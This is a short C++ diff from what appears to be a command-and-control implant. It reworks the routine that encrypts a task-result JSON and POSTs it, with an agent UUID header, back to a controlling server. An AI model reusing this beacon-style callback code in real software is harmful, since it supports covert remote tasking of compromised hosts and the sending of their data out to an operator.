@@ -340,12 +340,12 @@ namespace Handler
     {
         // Prepare additional headers
         std::wstring wHeaders;
-        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n" + L"X-Task: " + pState->wTask + L"\r\n";
+        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         // Encrypt task result
-        std::wstring wEncResult = Crypt::Encrypt(Utils::Convert::UTF8Decode(pState->taskResultJSON.dump()));
-        // I couln't retrieve the `wstring` length correctly, so use `string` here.
-        std::string sEncResult = Utils::Convert::UTF8Encode(wEncResult);
+        std::string sTaskResultJSON = pState->taskResultJSON.dump();
+        std::wstring wEnc = Crypt::Encrypt(std::vector<BYTE>(sTaskResultJSON.begin(), sTaskResultJSON.end()));
+        std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
             pState->pProcs,
@@ -355,8 +355,8 @@ namespace Handler
             pState->lpReqPathTaskResult,
             L"POST",
             wHeaders.c_str(),
-            (LPVOID)sEncResult.c_str(),
-            (DWORD)strlen(sEncResult.c_str())
+            (LPVOID)sEnc.c_str(),
+            (DWORD)strlen(sEnc.c_str())
         );
 
         if (!resp.bResult || resp.dwStatusCode != 200)
